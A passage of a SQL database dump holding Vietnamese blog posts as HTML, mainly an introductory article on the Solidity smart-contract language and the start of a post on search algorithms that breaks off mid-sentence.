giảm thời gian xử l&yacute; y&ecirc;u cầu.</p>\r\n	</li>\r\n</ul>', 'photo/1490893009computer-forensics3.jpg', 'admin', 0, '2024-06-29 06:25:21'),
(103, 'Solidity là gì? Bất kỳ Blockchain Developer nào cũng nên biết', 'dev ơi mình đi đâu thế?', '<p>Muốn trở th&agrave;nh&nbsp;<strong>Blockchain Developer</strong>&nbsp;th&igrave; chắc chắn bạn kh&ocirc;ng thể bỏ qua&nbsp;<strong>ng&ocirc;n ngữ lập tr&igrave;nh Solidity</strong>.</p>\r\n\r\n<p>H&agrave;ng năm, thế giới chi h&agrave;ng tỷ đ&ocirc; la cho c&aacute;c giải ph&aacute;p blockchain. Nhiều trong số c&aacute;c giải ph&aacute;p n&agrave;y được tạo ra bằng c&aacute;ch sử dụng ng&ocirc;n ngữ Solidity.</p>\r\n\r\n<p>Nhu cầu thị trường về mảng&nbsp;<strong>lập tr&igrave;nh Smart Contract</strong>&nbsp;tại Việt Nam cũng đang tăng rất mạnh.</p>\r\n\r\n<p>Dạo một v&ograve;ng c&aacute;c trang tuyển dụng ở Việt Nam, ta c&oacute; thể dễ d&agrave;ng thấy mức lương cho một Blockchain Developer kh&aacute; l&agrave; hấp dẫn.</p>\r\n\r\n<p>Vậy th&igrave;&nbsp;<strong>ng&ocirc;n ngữ lập tr&igrave;nh Solidity l&agrave; g&igrave;</strong>? N&oacute; hoạt động như thế n&agrave;o? L&agrave;m sao để bắt đầu l&agrave;m việc với n&oacute;? Liệu c&oacute; n&ecirc;n đầu tư để học n&oacute; ngay b&acirc;y giờ hay kh&ocirc;ng?</p>\r\n\r\n<p>C&ugrave;ng đọc tiếp b&agrave;i viết để trả lời những c&acirc;u hỏi tr&ecirc;n bạn nh&eacute;!</p>\r\n\r\n<p><strong>Ng&ocirc;n ngữ lập tr&igrave;nh Solidity l&agrave; g&igrave;?</strong></p>\r\n\r\n<p>Solidity l&agrave; một ng&ocirc;n ngữ lập tr&igrave;nh&nbsp;<strong>hướng đối tượng, high-level, curly-bracket</strong>&nbsp;được ph&aacute;t triển bởi team&nbsp;<strong>Ethereum Network</strong>.</p>\r\n\r\n<p>Ng&ocirc;n ngữ n&agrave;y ra đời nhằm để x&acirc;y dựng v&agrave; thiết kế c&aacute;c Smart Contracts (hợp đồng th&ocirc;ng minh) tr&ecirc;n c&aacute;c nền tảng của blockchain.</p>\r\n\r\n<p>N&oacute; c&oacute; rất nhiều điểm tương đồng với&nbsp;<strong>C</strong>&nbsp;v&agrave;&nbsp;<strong>C ++</strong>.&nbsp;<strong>Solidity</strong>&nbsp;kh&aacute; đơn giản để học v&agrave; dễ hiểu. V&iacute; dụ:&nbsp;<code>main</code>&nbsp;trong&nbsp;<strong>C</strong>&nbsp;tương đương với&nbsp;<code>contract</code>&nbsp;trong&nbsp;<strong>Solidity</strong>.</p>\r\n\r\n<p>Giống như c&aacute;c ng&ocirc;n ngữ lập tr&igrave;nh kh&aacute;c, Solidity cũng c&oacute;&nbsp;<strong>biến</strong>,&nbsp;<strong>h&agrave;m, classes, To&aacute;n tử số học, thao t&aacute;c chuỗi</strong>&nbsp;v&agrave; nhiều kh&aacute;i niệm kh&aacute;c.</p>\r\n\r\n<p><strong>Sự ra đời của ng&ocirc;n ngữ Solidity</strong></p>\r\n\r\n<p>Solidity l&agrave; một ng&ocirc;n ngữ tương đối mới v&agrave; n&oacute; c&oacute; sự ph&aacute;t triển tương đối nhanh ch&oacute;ng</p>\r\n\r\n<p><strong>Gavin Wood</strong>&nbsp;- một software developer người anh, đ&atilde; bắt đầu ph&aacute;t triển ng&ocirc;n ngữ lập tr&igrave;nh Solidity v&agrave;o năm 2014. Sau n&agrave;y, việc ph&aacute;t triển được ho&agrave;n th&agrave;nh bởi team Solidity của Ethereum.</p>\r\n\r\n<p>Dự &aacute;n được dẫn dắt bởi&nbsp;<strong>Christian Reitwiessner</strong>&nbsp;c&ugrave;ng với&nbsp;<strong>Alex Beregszaszi, Liana Husikyan</strong>, v&agrave;&nbsp;<strong>Yoichi Hirai</strong>.</p>\r\n\r\n<p><strong>Solidity hoạt động như thế n&agrave;o?</strong></p>\r\n\r\n<p>Solidity được d&ugrave;ng để x&acirc;y dựng v&agrave; thiết kế c&aacute;c Smart Contract.</p>\r\n\r\n<p>C&aacute;c đoạn code solidity sẽ được compile sang&nbsp;<strong>Ethereum Bytecodes</strong>&nbsp;v&agrave; được&nbsp;<strong>EVM</strong>&nbsp;thực thi th&agrave;nh c&aacute;c ứng dụng chạy tr&ecirc;n Ethereum.</p>\r\n\r\n<p><strong>EVM</strong>&nbsp;l&agrave; từ viết tắt của&nbsp;<strong>Ethereum Virtual Machine</strong>. N&oacute; cung cấp một m&ocirc;i trường runtime cho Ethereum smart contracts.</p>\r\n\r\n<p>!<a href=\"https://l.facebook.com/l.php?u=https%3A%2F%2Fstatics.cdn.200lab.io%2F2022%2F05%2FSolidity_Programming_3.jpg%3Ffbclid%3DIwZXh0bgNhZW0CMTAAAR2pLmjF_kjik4bFgtCbkzy5EtI8UYtVwiMlt_hOxxY_YcF8NQ6WiO0Re3c_aem_ARcekk6aufJ7OwIYkaAQxgpt5ZSJtBkrR5kFSC90Jp6ExA5Bc_y6ft853xL0tokfPu-EQHS4FoYCI08jR5bgDOWL&amp;h=AT3Duj4cSBKaClE0eB450cb266qNIAnXJB6_FIdWiUPDYuiZG0Lq9urpuTSsx-CWVBEnPXJkgrXwQIv23ctWKesipgYznVJiY8du2HYqPL34u5R2YCVIfgn5qDYaQlHWRgvfFByFFjXjJ_BJ6ps&amp;__tn__=-UK-R&amp;c[0]=AT2yAnIUW4J0GwQytr7aerqXGM8L97h9Vrs1php4haaPz3PABxrwD62bfuUsYPdLjUpveVp1UmpVtjwAUwS8Dhr6_X6m4mVzHBDa9y69kQjlEPnu47efEv7wT2mUN-UgURBROkvN_vqfJQv7wikwxgESJukjpRUHHaCJ-obxV8K9wXiQjtIF0dXDUwoJvfrRvc3edfCcbv4HAPrDrUp6D_-jKyffGGV79EPw5FE0qkY9eLicqg\" target=\"_blank\">https://statics.cdn.200lab.io/.../Solidity_Programming_3.jpg</a></p>\r\n\r\n<p>Solidity hoạt động như thế n&agrave;o?</p>\r\n\r\n<p>Smart contracts cho ph&eacute;p bạn tiến h&agrave;nh c&aacute;c giao dịch đ&aacute;ng tin cậy m&agrave; kh&ocirc;ng cần c&oacute; sự tham gia của b&ecirc;n thứ ba. C&aacute;c giao dịch n&agrave;y l&agrave; c&oacute; thể dễ d&agrave;ng truy vết v&agrave; kh&ocirc;ng thể đảo ngược được.</p>\r\n\r\n<p>Ng&ocirc;n ngữ lập tr&igrave;nh thường được sử dụng để tạo v&agrave; viết c&aacute;c hợp đồng th&ocirc;ng minh l&agrave;&nbsp;<strong>Serpent, Solidity, Mutan</strong>&nbsp;v&agrave;&nbsp;<strong>LLL</strong>.</p>\r\n\r\n<p>Một số nền tảng blockchain c&oacute; hỗ trợ Solidity:</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>Ethereum</p>\r\n	</li>\r\n	<li>\r\n	<p>Binance Smart Chain</p>\r\n	</li>\r\n	<li>\r\n	<p>Ethereum Classic</p>\r\n	</li>\r\n	<li>\r\n	<p>Tron</p>\r\n	</li>\r\n	<li>\r\n	<p>Hedera Hashgraph</p>\r\n	</li>\r\n	<li>\r\n	<p>Avalanche</p>\r\n	</li>\r\n</ul>\r\n\r\n<p><strong>Public v&agrave; Private functions của Solidity</strong></p>\r\n\r\n<p><strong>Public functions</strong>&nbsp;tương tự như c&aacute;c APIs m&agrave; bất kỳ ai tr&ecirc;n thế giới đều c&oacute; thể truy cập được. Bất kỳ ai cũng c&oacute; thể gọi được c&aacute;c APIs n&agrave;y.</p>\r\n\r\n<p>V&iacute; dụ, một public function c&oacute; thể được thực hiện để cho ph&eacute;p tất cả người d&ugrave;ng của một nền tảng kiểm tra số dư t&agrave;i khoản của họ. Một trong những c&aacute;ch phổ biến nhất để khai th&aacute;c smart contracts đ&oacute; l&agrave; th&ocirc;ng qua public functions.</p>\r\n\r\n<p><strong>Private functions</strong>&nbsp;chỉ được gọi từ b&ecirc;n trong c&aacute;c hợp đồng. Ch&uacute;ng chứa c&aacute;c hướng dẫn chỉ c&oacute; thể được thực thi sau khi được gọi bởi c&aacute;c h&agrave;m kh&aacute;c trong một chain.</p>\r\n\r\n<p><strong>C&aacute;c ti&ecirc;u chuẩn v&agrave; code logic trong Solidity</strong></p>\r\n\r\n<p>C&aacute;c ti&ecirc;u chuẩn về c&aacute;ch&nbsp;<strong>Solidity Smart Contract</strong>&nbsp;được sử dụng để build ứng dụng tr&ecirc;n Ethereum dần được x&aacute;c định. Những ti&ecirc;u chuẩn n&agrave;y được biết với c&aacute;i t&ecirc;n l&agrave; ti&ecirc;u chuẩn&nbsp;<strong>ERC (Ethereum Request for Comments)</strong>.</p>\r\n\r\n<p>C&aacute;c ti&ecirc;u chuẩn&nbsp;<strong>ERC</strong>&nbsp;bao gồm:</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>ERC20</p>\r\n	</li>\r\n	<li>\r\n	<p>ERC165</p>\r\n	</li>\r\n	<li>\r\n	<p>ERC721</p>\r\n	</li>\r\n	<li>\r\n	<p>ERC223</p>\r\n	</li>\r\n	<li>\r\n	<p>ERC621</p>\r\n	</li>\r\n	<li>\r\n	<p>ERC777</p>\r\n	</li>\r\n	<li>\r\n	<p>ERC827</p>\r\n	</li>\r\n	<li>\r\n	<p>ERC884</p>\r\n	</li>\r\n	<li>\r\n	<p>ERC865</p>\r\n	</li>\r\n	<li>\r\n	<p>ERC1155</p>\r\n	</li>\r\n</ul>\r\n\r\n<p><strong>Gas Costs</strong></p>\r\n\r\n<p>Khi sử dụng Solidity tr&ecirc;n&nbsp;<strong>Ethereum mainnet</strong>&nbsp;sẽ ph&aacute;t sinh th&ecirc;m một số chi ph&iacute;. Chi ph&iacute; n&agrave;y dựa tr&ecirc;n&nbsp;<strong>hệ thống gas</strong>&nbsp;tr&ecirc;n Ethereum.</p>\r\n\r\n<p>N&oacute; được d&ugrave;ng thanh to&aacute;n cho c&aacute;c&nbsp;<strong>miner</strong>, để họ c&oacute; thể thức hiện c&aacute;c phương thức nhằm đảm bảo code c&oacute; thể chạy an to&agrave;n tr&ecirc;n mạng blockchain network.</p>\r\n\r\n<p>Khi viết smart contract, bạn h&atilde;y nhớ rằng gas cost c&oacute; thể ảnh hưởng đến hiệu năng của Smart Contract.</p>\r\n\r\n<p>Ph&iacute; Gas được trả cho mỗi slot dung lượng lưu trữ thế n&ecirc;n mỗi hoạt động thực thi code Solidity đều tốn ph&iacute;.</p>\r\n\r\n<p>Một smart contract m&agrave; tốn qu&aacute; nhiều ph&iacute; gas để chạy th&igrave; kh&oacute; c&oacute; thể sử dụng về l&acirc;u d&agrave;i.</p>\r\n\r\n<p><strong>Tối ưu h&oacute;a Gas</strong>&nbsp;gi&uacute;p giảm chi ph&iacute; khi Solidity code được thực thi. Một v&agrave;i phương thức quan trọng nhất để tối ưu đ&oacute; ch&iacute;nh l&agrave; h&atilde;y sử dụng c&aacute;c thư viện c&oacute; sẵn v&agrave; d&ugrave;ng &iacute;t c&aacute;c h&agrave;m hơn.</p>\r\n\r\n<p>Thay v&igrave; th&ecirc;m c&aacute;c bytecode kh&ocirc;ng cần thiết v&agrave;o smart contract th&igrave; bạn c&oacute; thể đưa c&aacute;c logic đ&oacute; v&agrave;o thư viện. Điều n&agrave;y gi&uacute;p smart contract c&oacute; size nhỏ hơn.</p>\r\n\r\n<p>Bạn c&oacute; thể đọc th&ecirc;m b&agrave;i viết về Gas fee v&agrave; đơn vị t&iacute;nh trong ethereum của 200Lab</p>\r\n\r\n<p><strong>Data types của ng&ocirc;n ngữ lập tr&igrave;nh Solidity</strong></p>\r\n\r\n<p>!<a href=\"https://l.facebook.com/l.php?u=https%3A%2F%2Fstatics.cdn.200lab.io%2F2022%2F05%2FSolidity_Programming_5.jpg%3Ffbclid%3DIwZXh0bgNhZW0CMTAAAR3wjRWaqxUGXmhmbW3c9ol38l1Cx_n2v0cMKkAKO9UDl4xk62rSk9Gq4oM_aem_ARdYYl2I_kzZRMxbr2kBVoI7v8yynzvb2VNzrRjKrJdNgJEUugNl80CDmhV6qmaRiZ5fN1TGDLIgyjFWy_QeMpfR&amp;h=AT3uleb7NxMcksugUS50kIy_n0CqGxq2LtMAEf4dgeIjYhqdzkKB0OiImGLld3B0eONB_Y9RwUPqDVqRaft8WCSXHMPUF6jg8eoL-KgScesc5et_COP80VVLLKDVN7dr2tAC2Ex5Wmnel-s9b8w&amp;__tn__=-UK-R&amp;c[0]=AT2yAnIUW4J0GwQytr7aerqXGM8L97h9Vrs1php4haaPz3PABxrwD62bfuUsYPdLjUpveVp1UmpVtjwAUwS8Dhr6_X6m4mVzHBDa9y69kQjlEPnu47efEv7wT2mUN-UgURBROkvN_vqfJQv7wikwxgESJukjpRUHHaCJ-obxV8K9wXiQjtIF0dXDUwoJvfrRvc3edfCcbv4HAPrDrUp6D_-jKyffGGV79EPw5FE0qkY9eLicqg\" target=\"_blank\">https://statics.cdn.200lab.io/.../Solidity_Programming_5.jpg</a></p>\r\n\r\n<p>Data types của Solidity</p>\r\n\r\n<p>Ng&ocirc;n ngữ Solidity hỗ trợ hầu hết c&aacute;c Data types thường thấy trong c&aacute;c ng&ocirc;n ngữ hướng đối tượng kh&aacute;c như l&agrave;:</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p><strong>Boolean</strong>&nbsp;- Kiểu dữ liệu Boolean trả về &lsquo;1 &#39;khi điều kiện l&agrave; đ&uacute;ng v&agrave;&lsquo; 0&#39; khi sai, t&ugrave;y thuộc v&agrave;o trạng th&aacute;i của điều kiện.</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Integer</strong>&nbsp;- bạn c&oacute; thể sign hoặc unsign c&aacute;c gi&aacute; trị integer trong Solidity. N&oacute; cũng hỗ trợ c&aacute;c runtime exceptions v&agrave; từ kh&oacute;a &ldquo;uint8&rdquo; v&agrave; &ldquo;uint256&rdquo;</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>String</strong>&nbsp;- kiểu dữ liệu dạng chuỗi</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Modifier</strong>&nbsp;- Trước khi thực thi c&aacute;c đoạn code của smart contract, một modifier thường kiểm tra xem bất kỳ điều kiện n&agrave;o c&oacute; hợp l&yacute; hay kh&ocirc;ng</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Array</strong>&nbsp;- Syntax của lập tr&igrave;nh Solidity cũng giống như c&aacute;c ng&ocirc;n ngữ OOP kh&aacute;c v&agrave; n&oacute; hỗ trợ cả array đơn v&agrave; array đa chiều.</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>Ngo&agrave;i ra, lập tr&igrave;nh Sollity cho ph&eacute;p bạn &quot;<strong>map</strong>&quot; c&aacute;c cấu tr&uacute;c dữ liệu với c&aacute;c&nbsp;<strong>enum, to&aacute;n tử</strong>&nbsp;v&agrave;&nbsp;<strong>gi&aacute; trị hash</strong>&nbsp;để trả về c&aacute;c gi&aacute; trị được lưu trữ ở c&aacute;c vị tr&iacute; lưu trữ cụ thể.</p>\r\n\r\n<p><strong>Bắt đầu lập tr&igrave;nh với ng&ocirc;n ngữ Solidity</strong></p>\r\n\r\n<p><strong>Version Pragma</strong></p>\r\n\r\n<p><code>pragma solidity &gt;=0.4.16 &lt;0.7.0;</code></p>\r\n\r\n<p><strong>Pragmas</strong>&nbsp;l&agrave; chỉ thị cho tr&igrave;nh bi&ecirc;n dịch về c&aacute;ch xử l&yacute; code. Mỗi d&ograve;ng source code solidity n&ecirc;n bắt đầu bằng &quot;phi&ecirc;n bản pragma&quot;, trong đ&oacute; chỉ định phi&ecirc;n bản n&agrave;o của tr&igrave;nh bi&ecirc;n dịch solidity để sử dụng.</p>\r\n\r\n<p>Điều n&agrave;y ngăn đoan code kh&ocirc;ng tương th&iacute;ch với c&aacute;c phi&ecirc;n bản tr&igrave;nh bi&ecirc;n dịch trong tương lai c&oacute; thể giới thiệu c&aacute;c thay đổi.</p>\r\n\r\n<p><strong>The contract keyword</strong></p>\r\n\r\n<p><code>contract Test{//Functions and Data}</code></p>\r\n\r\n<p><strong>Contract keyword</strong>&nbsp;khai b&aacute;o một contract đ&oacute;ng g&oacute;i đoạn code</p>\r\n\r\n<p><strong>State/ Declare Variables</strong></p>\r\n\r\n<p><code>uint public var1;</code></p>\r\n\r\n<p><code>uint public var2;</code></p>\r\n\r\n<p><code>uint public sum;</code></p>\r\n\r\n<p><strong>Biến state</strong>&nbsp;được viết tr&ecirc;n Ethereum Blockchain v&agrave; được duy tr&igrave; vĩnh viễn trong lưu trữ hợp đồng</p>\r\n\r\n<p>D&ograve;ng&nbsp;<strong>uint public var1</strong>&nbsp;khai b&aacute;o một biến state của kiểu&nbsp;<strong>uint</strong>&nbsp;c&oacute; t&ecirc;n&nbsp;<strong>var1</strong>&nbsp;(unsigned integer of 256 bits), n&oacute; tương tự việc th&ecirc;m một slot trong database.</p>\r\n\r\n<p><strong>H&agrave;m khai b&aacute;o</strong></p>\r\n\r\n<p><code>function set(uint a, uint b) public</code></p>\r\n\r\n<p><code>function get() public view returns (uint)</code></p>\r\n\r\n<p>Đ&acirc;y l&agrave; một h&agrave;m c&oacute; t&ecirc;n &quot;set&quot; của kiểu access modifier. N&oacute; lấy một biến a v&agrave; biến b của kiểu dữ liệu uint l&agrave;m tham số.</p>\r\n\r\n<p>Đ&acirc;y l&agrave; một v&iacute; dụ về một hợp đồng th&ocirc;ng minh đơn giản cập nhật gi&aacute; trị của var1 v&agrave; var2. Bất cứ ai c&oacute; quyền truy cập v&agrave;o blockchain Ethereum đều c&oacute; thể sử dụng h&agrave;m set để thay đổi gi&aacute; trị của var1 v&agrave; var2.</p>\r\n\r\n<p>Bằng c&aacute;ch th&ecirc;m c&aacute;c gi&aacute; trị của c&aacute;c biến var1 v&agrave; var2, n&oacute; c&oacute; thể t&iacute;nh to&aacute;n tổng biến.</p>\r\n\r\n<p>N&oacute; sẽ truy xuất v&agrave; in gi&aacute; trị của tổng biến state bằng c&aacute;ch sử dụng h&agrave;m &quot;get&quot;.</p>\r\n\r\n<p><strong>Thực thi code Solidity như thế n&agrave;o?</strong></p>\r\n\r\n<p>Bạn c&oacute; thể thực thi chương tr&igrave;nh Solidity bằng 2 c&aacute;ch l&agrave;&nbsp;<strong>offline mode</strong>&nbsp;v&agrave;&nbsp;<strong>online mode</strong></p>\r\n\r\n<p><strong>Offline Mode</strong></p>\r\n\r\n<p>Để vận h&agrave;nh một&nbsp;<strong>Solidity Smart Contract</strong>&nbsp;ở chế độ offline, cần phải đ&aacute;p ứng ba điều kiện v&agrave; tu&acirc;n theo bốn h&agrave;nh động cần thiết sau:</p>\r\n\r\n<p>Điều kiện:</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>Download v&agrave; install node.js.</p>\r\n	</li>\r\n	<li>\r\n	<p>Install Truffle globally.</p>\r\n	</li>\r\n	<li>\r\n	<p>Install ganache-cli.</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>H&agrave;nh động:</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>Tạo một truffle project v&agrave; set up một development network cho n&oacute;</p>\r\n	</li>\r\n	<li>\r\n	<p>Develop and deploy một smart contract</p>\r\n	</li>\r\n	<li>\r\n	<p>Tương t&aacute;c với smart contract từ Truffle console</p>\r\n	</li>\r\n	<li>\r\n	<p>Tạo những b&agrave;i test để đ&aacute;nh gi&aacute; những t&iacute;nh năng ch&iacute;nh của Solidity</p>\r\n	</li>\r\n</ul>\r\n\r\n<p><strong>Online mode</strong></p>\r\n\r\n<p>Trong chế độ online, Remix IDE thường được sử dụng để bi&ecirc;n dịch v&agrave; chạy c&aacute;c Solidity smart contract.</p>\r\n\r\n<p>Một số IDE platforms hỗ trợ Solidity:</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>Truffle</p>\r\n	</li>\r\n	<li>\r\n	<p>Hardhat</p>\r\n	</li>\r\n	<li>\r\n	<p>Microsoft Visual Studio</p>\r\n	</li>\r\n	<li>\r\n	<p>Microsoft Visual Studio Code</p>\r\n	</li>\r\n	<li>\r\n	<p>Tendermint on Microsoft Azure</p>\r\n	</li>\r\n</ul>\r\n\r\n<p><strong>Ưu điểm của ng&ocirc;n ngữ lập tr&igrave;nh Solidity</strong></p>\r\n\r\n<p>Ngo&agrave;i những t&igrave;nh năng ch&iacute;nh kể tr&ecirc;n, ng&ocirc;n ngữ lập tr&igrave;nh solidity c&ograve;n c&oacute; nhiều điểm cộng kh&aacute;c so với c&aacute;c ng&ocirc;n ngữ lập tr&igrave;nh dựa tr&ecirc;n Ethereum.</p>\r\n\r\n<p>Ngo&agrave;i c&aacute;c kiểu dữ liệu cơ bản, ng&ocirc;n ngữ lập tr&igrave;nh Solidity cũng chấp nhận c&aacute;c kiểu dữ liệu phức tạp v&agrave; c&aacute;c biến th&agrave;nh vi&ecirc;n.</p>\r\n\r\n<p>N&oacute; cung cấp một&nbsp;<strong>Application Binary Interface (ABI)</strong>&nbsp;để cho ph&eacute;p type safety. Nếu tr&igrave;nh bi&ecirc;n dịch ph&aacute;t hiện sự kh&ocirc;ng ph&ugrave; hợp kiểu dữ liệu cho bất kỳ biến n&agrave;o, ABI sẽ tạo một error.</p>\r\n\r\n<p>Solidity c&oacute; &#39;<strong>Natural Language Specification</strong>&#39;, được sử dụng để biến c&aacute;c th&ocirc;ng số kỹ thuật tập trung v&agrave;o người d&ugrave;ng th&agrave;nh ng&ocirc;n ngữ m&agrave; m&aacute;y m&oacute;c c&oacute; thể hiểu.</p>\r\n\r\n<p>Solidity l&agrave; ng&ocirc;n ngữ lập tr&igrave;nh bậc cao (high-level programming language) cho n&ecirc;n rất dễ đọc, dễ hiểu.</p>\r\n\r\n<p>Ng&ocirc;n ngữ lập tr&igrave;nh bậc cao l&agrave; một ng&ocirc;n ngữ đ&atilde; định sẵn cho ch&uacute;ng ta c&aacute;c biến, c&aacute;c kiểu dữ liệu, class để ch&uacute;ng ta dễ d&agrave;ng lập tr&igrave;nh hơn thay v&igrave; phải viết kh&aacute; l&agrave; nhiều thứ.</p>\r\n\r\n<p>C&aacute;c dev c&oacute; kinh nghiệm với java hoặc javascript sẽ thấy rất dễ tiếp cận với ng&ocirc;n ngữ n&agrave;y.</p>\r\n\r\n<p>V&igrave; Blockchain n&oacute;i chung v&agrave; Ethereum n&oacute;i ri&ecirc;ng đang ng&agrave;y c&agrave;ng lớn mạnh cho n&ecirc;n nguồn t&agrave;i liệu, source code demo rất nhiều v&agrave; đa dạng c&aacute;c use cases để mọi người c&oacute; thể tham khảo th&ecirc;m.</p>\r\n\r\n<p><strong>Điểm hạn chế của Solidity</strong></p>\r\n\r\n<p>Tuy vậy, bất kỳ ng&ocirc;n ngữ n&agrave;o cũng c&oacute; những điểm hạn chế ri&ecirc;ng, Solidity cũng kh&ocirc;ng phải l&agrave; một ngo&agrave;i lệ.</p>\r\n\r\n<p>Sau khi deploy smart contract, c&aacute;c đoạn code Solidity kh&ocirc;ng thể n&acirc;ng cấp, chỉnh sửa hay bổ sung th&ecirc;m được g&igrave; cả. Thế n&ecirc;n bạn cần kiểm tra thật kỹ lưỡng mọi thứ trước khi deploy l&ecirc;n mainnet.</p>\r\n\r\n<p>Solidity vẫn l&agrave; một ng&ocirc;n ngữ &ldquo;non trẻ&rdquo; so với c&aacute;c ng&ocirc;n ngữ l&acirc;u đời như C hoặc Java. Điều đ&oacute; dẫn đến việc trong một số trường hợp, n&oacute; sẽ kh&ocirc;ng c&oacute; nhiều thư viện thỏa nhu cầu sử dụng của bạn.</p>\r\n\r\n<p><strong>Lời Kết</strong></p>\r\n\r\n<p>C&ocirc;ng nghệ Blockchain sẽ dần c&aacute;ch mạng h&oacute;a c&aacute;c ng&agrave;nh c&ocirc;ng nghiệp kh&aacute;c trong tương lai. Ng&agrave;nh blockchain developer sẽ trở n&ecirc;n rất cần thiết v&agrave; n&oacute; chỉ mới thực sự nở rộ trong khoảng 1,2 năm gần đ&acirc;y. Do đ&oacute;, về nh&acirc;n lực, nguồn cầu lớn hơn cung rất nhiều thế n&ecirc;n cơ hội đang chia đều cho tất cả mọi người.</p>\r\n\r\n<p>Để nắm bắt tốt cơ hội trong mảng lập tr&igrave;nh blockchain th&igrave; lập tr&igrave;nh ng&ocirc;n ngữ Solidity l&agrave; thứ cơ bản nhất bạn cần phải biết.</p>', 'photo/13.png', 'admin', 0, '2024-06-29 06:25:21'),
(104, '5 THUẬT TOÁN TÌM KIẾM THÚ VỊ DÀNH CHO LẬP TRÌNH VIÊN', 'dev ơi mình đi đâu thế?', '<p>&nbsp;</p>\r\n\r\n<p>----------------------------------------</p>\r\n\r\n<p>1.<strong>&nbsp;T&igrave;m kiếm tuyến t&iacute;nh (Linear search):</strong>&nbsp;Kiểm tra từng phần tử trong danh s&aacute;ch cho đến khi t&igrave;m thấy kết quả hoặc hết danh s&aacute;ch.</p>\r\n\r\n<p>2.&nbsp;<strong>T&igrave;m kiếm nhị ph&acirc;n (Binary search):</strong>&nbsp;&Aacute;p dụng v&agrave;o danh s&aacute;ch đ&atilde; được sắp xếp. Chia đ&ocirc;i danh s&aacute;ch v&agrave; so s&aacute;nh gi&aacute; trị t&igrave;m kiếm với phần tử ở giữa. Nếu bằng nhau, kết th&uacute;c t&igrave;m kiếm; nếu kh&ocirc;ng, tiếp tục t&igrave;m trong nửa ph&iacute;a trước hoặc nửa ph&iacute;a sau của danh s&aacute;ch.</p>\r\n\r\n<p>T&igrave;m kiếm nhị ph&acirc;n l&agrave; một thuật to&aacute;n được sử dụng để t&igrave;m kiếm một phần tử cụ thể trong một mảng đ&atilde; được sắp xếp theo thứ tự tăng dần (hoặc giảm dần). Thuật to&aacute;n n&agrave;y hoạt động bằng c&aacute;ch so s&aacute;nh phần tử cần t&igrave;m với phần tử ở giữa mảng. Nếu phần tử ở giữa mảng nhỏ hơn phần tử cần t&igrave;m, th&igrave; t&igrave;m kiếm được tiếp tục tr&ecirc;n mảng con b&ecirc;n phải. Ngược lại, nếu phần tử ở giữa mảng lớn hơn phần tử cần t&igrave;m, th&igrave; t&igrave;m kiếm được tiếp tục tr&ecirc;n mảng con b&ecirc;n tr&aacute;i. Thuật to&aacute;n n&agrave;y lặp lại qu&aacute; tr&igrave;nh n&agrave;y cho đến khi t&igrave;m thấy phần tử cần t&igrave;m hoặc khi cả mảng đ&atilde; được duyệt hết.</p>\r\n\r\n<p>Trong t&igrave;m kiếm nhị ph&acirc;n, mỗi lần so s&aacute;nh giữa phần tử ở giữa mảng v&agrave; phần tử cần t&igrave;m giảm đi một nửa số phần tử so với lần trước, do đ&oacute; thuật to&aacute;n n&agrave;y c&oacute; hiệu suất t&igrave;m kiếm cao hơn so với t&igrave;m kiếm tuyến t&iacute;nh.</p>\r\n\r\n<p>T&igrave;m kiếm nhị ph&acirc;n được sử dụng rộng r&atilde;i trong c&aacute;c b&agrave;i to&aacute;n t&igrave;m kiếm tr&ecirc;n dữ liệu đ&atilde; được sắp xếp nhanh ch&oacute;ng v&agrave; hiệu quả.</p>\r\n\r\n<p>3.<strong>&nbsp;T&igrave;m kiếm bằng bảng băm (Hashing):</strong>&nbsp;Dựa v&agrave;o h&agrave;m băm để x&aacute;c định vị tr&iacute; của phần tử cần t&igrave;m trong bảng băm. T&igrave;m kiếm n&agrave;y c&oacute; độ phức tạp O(1) trung b&igrave;nh.</p>\r\n\r\n<p>4.&nbsp;<strong>T&igrave;m kiếm t&igrave;m kiếm theo đường ch&eacute;o (Jump search)</strong>: &Aacute;p dụng v&agrave;o danh s&aacute;ch đ&atilde; được sắp xếp. Nhảy từ phần tử n&agrave;y sang phần tử kh&aacute;c với một khoảng c&aacute;ch mốc cho đến khi t&igrave;m được v&ugrave;ng phần tử cần t&igrave;m. Tiếp tục t&igrave;m kiếm trong v&ugrave;ng n&agrave;y bằng t&igrave;m kiếm tuyến t&iacute;nh.</p>\r\n\r\n<p>Jump Search l&agrave; thuật to&aacute;n t&igrave;m kiếm trong một mảng đ&atilde; được sắp xếp. &Yacute; tưởng của thuật to&aacute;n n&agrave;y l&agrave; sử dụng một bước &quot;nhảy&quot; cố định để kiểm tra c&aacute;c phần tử trong mảng, thay v&igrave; kiểm tra từng phần tử một theo thứ tự tuyến t&iacute;nh. Dưới đ&acirc;y l&agrave; &yacute; tưởng cơ bản của thuật to&aacute;n Jump Search trong C++:</p>\r\n\r\n<p>+Đầu ti&ecirc;n, kiểm tra phần tử ở vị tr&iacute; đầu ti&ecirc;n (vị tr&iacute; 0) trong mảng đ&atilde; được sắp xếp. Nếu phần tử n&agrave;y tr&ugrave;ng với gi&aacute; trị cần t&igrave;m, thuật to&aacute;n kết th&uacute;c v&agrave; trả về vị tr&iacute; n&agrave;y.</p>\r\n\r\n<p>+ Tiếp theo, x&aacute;c định k&iacute;ch thước của bước &quot;nhảy&quot; sử dụng căn bậc hai của k&iacute;ch thước mảng. Đặt biến jump_size = sqrt(size), trong đ&oacute; size l&agrave; số lượng phần tử trong mảng.</p>\r\n\r\n<p>+ Bắt đầu từ vị tr&iacute; jump_size, kiểm tra phần tử tại vị tr&iacute; hiện tại. Nếu phần tử n&agrave;y lớn hơn gi&aacute; trị cần t&igrave;m, ta di chuyển quay lại vị tr&iacute; jump_size/2 v&agrave; tiếp tục bước n&agrave;y cho đến khi t&igrave;m được phần tử nhỏ hơn hoặc bằng gi&aacute; trị cần t&igrave;m (hoặc khi vị tr&iacute; đang x&eacute;t vượt qu&aacute; phạm vi mảng).</p>\r\n\r\n<p>+ Khi t&igrave;m được một phần tử 